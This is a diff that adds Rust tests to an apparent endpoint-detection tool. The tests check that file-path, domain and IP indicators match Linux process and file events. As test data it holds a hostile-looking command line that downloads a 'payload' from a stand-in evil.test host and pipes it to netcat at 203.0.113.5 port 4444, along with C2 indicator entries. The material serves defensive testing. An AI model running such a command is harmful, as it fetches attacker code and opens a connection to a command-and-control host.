@@ -7,10 +7,12 @@ use common::{
     TEST_DOMAIN, TEST_PID,
 };
 use rustinel::{
-    ioc::{HashCache, IocEngine},
-    models::{CanonicalEvent, Provenance},
+    engine::{Engine, EventDetectors},
+    ioc::{HashCache, IocEngine, IocKind},
+    models::{CanonicalEvent, EventFields, Provenance},
     sensor::Platform,
 };
+use std::sync::Arc;
 
 #[test]
 fn domain_ioc_matches_exact_and_suffix_dns_events() {
@@ -285,4 +287,95 @@ fn domain_metadata_preserves_duplicate_lines_and_optional_comments() {
             }
         );
     }
+}
+
+/// A Linux process start whose command line is exactly `command_line`, run from
+/// `cwd`.
+fn linux_process(command_line: &str, cwd: Option<&str>) -> CanonicalEvent {
+    let harness = TestNormalizer::new();
+    let mut normalized = harness
+        .normalizer
+        .normalize(&process_start_event(Platform::Linux))
+        .expect("process event should normalize");
+    let EventFields::ProcessCreation(fields) = &mut normalized.fields else {
+        panic!("expected process fields");
+    };
+    fields.image = Some("/usr/bin/chmod".to_string());
+    fields.parent_image = Some("/usr/bin/bash".to_string());
+    fields.command_line = Some(command_line.to_string());
+    fields.current_directory = cwd.map(str::to_owned);
+    CanonicalEvent::from_normalized(normalized)
+}
+
+#[test]
+fn relative_command_line_operands_alert_like_their_absolute_form() {
+    // #231 Cases 3 and 4: `chmod +x /tmp/malware`, then `cd /tmp` and
+    // `chmod +x malware`. Both name the same file, so both must alert, and
+    // each alert must still report the command line exactly as it was run.
+    let fixture = IocFixture::new();
+    fixture.write_paths_regex("^/tmp/malware$; staged payload\n");
+    let detectors = EventDetectors::new(
+        Arc::new(Engine::new_for_platform(Platform::Linux)),
+        Arc::new(IocEngine::load(&fixture.config())),
+    );
+
+    for command_line in ["chmod +x /tmp/malware", "chmod +x malware"] {
+        let event = linux_process(command_line, Some("/tmp"));
+        let alerts = detectors.evaluate(&event);
+        assert_eq!(alerts.len(), 1, "{command_line}");
+
+        let alert = &alerts[0];
+        assert_eq!(alert.rule_name, "ioc:path_regex:^/tmp/malware$");
+        assert!(alert
+            .rule_description
+            .as_deref()
+            .is_some_and(|description| description.contains("observed: /tmp/malware")));
+        assert_eq!(alert.event.get_field("CommandLine"), Some(command_line));
+        assert_ecs_field_eq(&ecs_json(alert), "process.command_line", command_line);
+    }
+
+    // Without a working directory there is nothing honest to resolve against.
+    assert!(detectors
+        .evaluate(&linux_process("chmod +x malware", None))
+        .is_empty());
+}
+
+#[test]
+fn previously_unchecked_fields_reach_every_indicator_kind() {
+    let fixture = IocFixture::new();
+    fixture.write_paths_regex("^/usr/bin/bash$; parent\n^/tmp/staged$; rename source\n");
+    fixture.write_domains(".evil.test; c2\n");
+    fixture.write_ips("203.0.113.0/24; c2 range\n");
+    let engine = IocEngine::load(&fixture.config());
+    let harness = TestNormalizer::new();
+
+    let process = linux_process(
+        "sh -c curl -o payload https://cdn.evil.test/x | nc 203.0.113.5 4444",
+        Some("/home/user"),
+    );
+    let kinds: Vec<(IocKind, String)> = engine
+        .check_event(&process)
+        .into_iter()
+        .map(|m| (m.kind, m.observed))
+        .collect();
+    assert_eq!(
+        kinds,
+        [
+            (IocKind::Domain, "cdn.evil.test".to_string()),
+            (IocKind::Ip, "203.0.113.5".to_string()),
+            (IocKind::PathRegex, "/usr/bin/bash".to_string()),
+        ]
+    );
+
+    let mut rename = harness
+        .normalizer
+        .normalize(&file_create_event(Platform::Linux))
+        .expect("file event should normalize");
+    let EventFields::FileEvent(fields) = &mut rename.fields else {
+        panic!("expected file fields");
+    };
+    fields.source_filename = Some("/tmp/staged".to_string());
+    let matches = engine.check_event(&CanonicalEvent::from_normalized(rename));
+    assert_eq!(matches.len(), 1);
+    assert_eq!(matches[0].observed, "/tmp/staged");
 }
